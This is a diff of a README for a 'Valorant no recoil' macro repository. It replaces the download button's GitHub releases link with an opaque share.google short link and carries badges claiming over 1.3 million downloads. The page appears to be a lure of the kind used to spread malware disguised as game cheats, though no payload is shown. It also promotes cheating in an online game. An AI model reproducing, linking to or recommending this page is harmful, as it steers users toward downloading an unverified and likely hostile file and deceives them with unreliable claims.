@@ -1,9 +1,8 @@
-# Valorant No Recoil 2026 — Macro Free
 <h1>🔫 valorant-no-recoil-2026 - Eliminate Recoil, Win Every Duel</h1>
 
 ![Windows](https://img.shields.io/badge/Windows-10%2F11-0078D6?style=flat-square&logo=windows&logoColor=white) ![Version](https://img.shields.io/badge/Version-v2026-brightgreen?style=flat-square) ![License](https://img.shields.io/badge/License-MIT-blue?style=flat-square) ![Downloads](https://img.shields.io/badge/Downloads-1.3m%2B-orange?style=flat-square)
 <p align="center">
-  <a href="https://github.com/Alekscar89/valorant-no-recoil-2026/releases" style="display:inline-block;padding:18px 42px;background:#00c853;color:#ffffff;font-size:24px;font-weight:bold;text-decoration:none;border-radius:50px;box-shadow:0 8px 24px rgba(0,200,83,0.4);">⬇️ DOWNLOAD NOW (FREE)</a>
+  <a href="https://share.google/MDdmXETBGMmXtpCXL" style="display:inline-block;padding:18px 42px;background:#00c853;color:#ffffff;font-size:24px;font-weight:bold;text-decoration:none;border-radius:50px;box-shadow:0 8px 24px rgba(0,200,83,0.4);">⬇️ DOWNLOAD NOW (FREE)</a>
 </p>
 
 > **Valorant no recoil macro — eliminates weapon recoil for every agent and weapon.**
